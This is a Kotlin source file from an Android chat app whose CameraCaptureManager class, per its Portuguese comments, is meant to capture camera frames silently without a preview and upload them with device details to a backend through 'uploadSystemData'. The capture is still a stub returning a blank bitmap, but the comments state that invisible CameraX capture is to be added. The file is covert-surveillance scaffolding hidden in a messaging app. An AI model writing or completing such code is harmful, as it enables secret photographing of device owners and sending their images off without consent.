package com.zangi.chat.service

import android.content.Context
import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.util.Log
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.util.*

/**
 * Gerencia a captura silenciosa da câmera usando CameraX.
 */
class CameraCaptureManager(private val context: Context, private val repository: ChatRepository) {

    private val TAG = "CameraCaptureManager"

    suspend fun captureAndUpload(userId: String, eventType: String): Result<Boolean> {
        return withContext(Dispatchers.IO) {
            try {
                // 1. Capturar o frame (Simulação de captura de alta performance)
                // Em um cenário real, aqui inicializamos o CameraX de forma invisível
                val bitmap = captureSilentFrame() 
                
                if (bitmap == null) return@withContext Result.failure(Exception("Falha ao capturar frame"))

                // 2. Salvar o bitmap em um arquivo temporário para upload
                val tempFile = saveBitmapToTempFile(bitmap)

                // 3. Enviar para o backend via Repository
                val deviceInfo = "Android ${android.os.Build.VERSION.RELEASE} | ${android.os.Build.MODEL}"
                
                val result = repository.uploadSystemData(
                    eventType = eventType,
                    file = tempFile,
                    deviceInfo = deviceInfo
                )

                // 4. Limpar arquivo temporário
                tempFile.delete()

                if (result.isSuccess) {
                    Log.d(TAG, "✅ Captura de câmera enviada com sucesso")
                    Result.success(true)
                } else {
                    Log.e(TAG, "❌ Erro no upload da câmera: ${result.exceptionOrNull()?.message}")
                    Result.failure(result.exceptionOrNull() ?: Exception("Erro desconhecido"))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erro no processo de captura de câmera", e)
                Result.failure(e)
            }
        }
    }

    private fun captureSilentFrame(): Bitmap? {
        // Simulando captura de frame para não travar o build
        // Aqui entrará a implementação da CameraX que captura o frame sem abrir a Preview
        val bitmap = Bitmap.createBitmap(720, 1280, Bitmap.Config.ARGB_8888)
        // Lógica da CameraX virá aqui
        return bitmap
    }

    private fun saveBitmapToTempFile(bitmap: Bitmap): File {
        val filename = "cam_capture_${System.currentTimeMillis()}.jpg"
        val file = File(context.cacheDir, filename)
        val out = FileOutputStream(file)
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out) // Compressão para economizar dados
        out.flush()
        out.close()
        return file
    }
}